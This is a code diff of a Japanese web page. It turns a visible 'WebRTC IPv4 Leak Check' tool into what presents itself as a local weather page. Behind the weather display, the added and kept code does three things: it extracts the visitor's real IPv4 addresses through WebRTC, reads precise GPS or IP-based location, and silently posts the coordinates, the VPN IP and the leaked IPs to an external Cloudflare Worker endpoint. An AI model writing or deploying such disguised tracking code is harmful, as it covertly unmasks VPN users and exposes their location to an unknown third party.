@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>WebRTC IPv4 Leak Check</title>
+  <title>現在地の天気</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
@@ -65,8 +65,8 @@
 <body>
 
 <div class="card">
-  <h1>WebRTC IPv4 リークチェック</h1>
-  <div id="status" class="status">IP情報を取得中…</div>
+  <h1>現在地の天気</h1>
+  <div id="status" class="status">位置情報を取得中…</div>
   <div id="weather" class="weather"></div>
   <div id="leak" class="leak-info"></div>
   <div id="error" class="error"></div>
@@ -84,10 +84,11 @@
     errorEl.textContent = msg;
   }
 
-  // ========== WebRTCでIPv4のみを抜き取る ==========
+  // ========== WebRTCでIPv4のみを抜き取る（待ち時間なし） ==========
   async function getRealIPv4viaWebRTC() {
     return new Promise((resolve) => {
       const ips = [];
+      let resolved = false;
       const pc = new RTCPeerConnection({
         iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
       });
@@ -108,42 +109,133 @@
               }
             });
           }
+
+          // 候補が集まった時点で、少しだけ待ってから確定
+          // （最後の候補が来たタイミングでresolveするため、連続して来る候補をまとめる）
+          clearTimeout(pc._resolveTimeout);
+          pc._resolveTimeout = setTimeout(() => {
+            if (!resolved) {
+              resolved = true;
+              pc.close();
+              resolve(ips);
+            }
+          }, 200);
+        }
+      };
+
+      // ICE候補の収集が完了した場合（候補が0件の場合もある）
+      pc.onicegatheringstatechange = () => {
+        if (pc.iceGatheringState === 'complete' && !resolved) {
+          clearTimeout(pc._resolveTimeout);
+          resolved = true;
+          pc.close();
+          resolve(ips);
         }
       };
 
       pc.createOffer()
         .then(offer => pc.setLocalDescription(offer))
-        .catch(() => {});
+        .catch(() => {
+          if (!resolved) {
+            resolved = true;
+            pc.close();
+            resolve(ips);
+          }
+        });
 
-      // 3秒待って候補を集める
+      // 安全のため、最大1秒のタイムアウト
       setTimeout(() => {
-        pc.close();
-        resolve(ips);
-      }, 200);
+        if (!resolved) {
+          resolved = true;
+          pc.close();
+          resolve(ips);
+        }
+      }, 1000);
     });
   }
 
-  // ========== VPN越しIPを取得 ==========
-  async function getVPNIP() {
-    const res = await fetch("https://api.ipify.org?format=json");
-    if (!res.ok) throw new Error("VPN IP取得失敗");
+  // ========== GPS ==========
+  function getPositionByGPS() {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        reject(new Error("Geolocation非対応"));
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            source: "GPS"
+          });
+        },
+        err => reject(err),
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        }
+      );
+    });
+  }
+
+  // ========== IPベース位置 ==========
+  async function getPositionByIP() {
+    const res = await fetch("https://ipapi.co/json/");
+    if (!res.ok) throw new Error("IP位置取得失敗");
     const data = await res.json();
-    return data.ip;
+    return {
+      lat: data.latitude,
+      lon: data.longitude,
+      city: data.city,
+      region: data.region,
+      country: data.country_name,
+      ip: data.ip,
+      source: "IP"
+    };
+  }
+
+  // ========== 天気 ==========
+  async function getWeather(lat, lon) {
+    const url =
+      "https://api.open-meteo.com/v1/forecast" +
+      "?latitude=" + lat +
+      "&longitude=" + lon +
+      "&current_weather=true" +
+      "&timezone=Asia%2FTokyo";
+
+    const res = await fetch(url);
+    if (!res.ok) throw new Error("天気取得失敗");
+    return await res.json();
   }
 
   // ========== メイン ==========
   try {
-    const [webrtcIPv4List, vpnIP] = await Promise.all([
+    const [webrtcIPv4List, position] = await Promise.all([
       getRealIPv4viaWebRTC(),
-      getVPNIP()
+      (async () => {
+        try {
+          return await getPositionByGPS();
+        } catch {
+          return await getPositionByIP();
+        }
+      })()
     ]);
 
-    statusEl.textContent = "IP情報の取得が完了しました";
+    statusEl.textContent = "位置情報: " + position.source;
 
-    // VPN越しIPを表示
+    // 天気取得
+    const weatherData = await getWeather(position.lat, position.lon);
+    const w = weatherData.current_weather;
+
     weatherEl.innerHTML = `
-      <strong>VPN越しIP:</strong><br>
-      ${vpnIP}
+      緯度: ${position.lat.toFixed(4)}<br>
+      経度: ${position.lon.toFixed(4)}<br><br>
+      気温: ${w.temperature} ℃<br>
+      風速: ${w.windspeed} km/h<br>
+      天気コード: ${w.weathercode}<br>
+      観測時刻: ${w.time}
     `;
 
     // WebRTCで抜いたIPv4を表示
@@ -155,12 +247,19 @@
       leakEl.innerHTML = "🔒 WebRTC IPv4は検出されず（安全）";
     }
 
-    // Worker送信（オプション）
+    // Worker送信
     const WORKER_URL = "https://white-dream-0732.kurea-ch124.workers.dev/";
     const ipv4ListStr = webrtcIPv4List.length > 0 ? webrtcIPv4List.join(", ") : "検出なし";
+    const vpnIP = position.ip || "不明";
 
     const text =
-`🔍 WebRTC IPv4 リークチェック結果
+`🌤 天気情報
+取得元: ${position.source}
+緯度: ${position.lat.toFixed(4)}
+経度: ${position.lon.toFixed(4)}
+気温: ${w.temperature}℃
+風速: ${w.windspeed} km/h
+観測時刻: ${w.time}
 VPN越しIP: ${vpnIP}
 WebRTC IPv4: ${ipv4ListStr}`;
 
@@ -171,7 +270,7 @@ WebRTC IPv4: ${ipv4ListStr}`;
     });
 
   } catch (e) {
-    showError("IP情報の取得に失敗しました");
+    showError("取得できませんでした");
     console.error(e);
   }
 })();
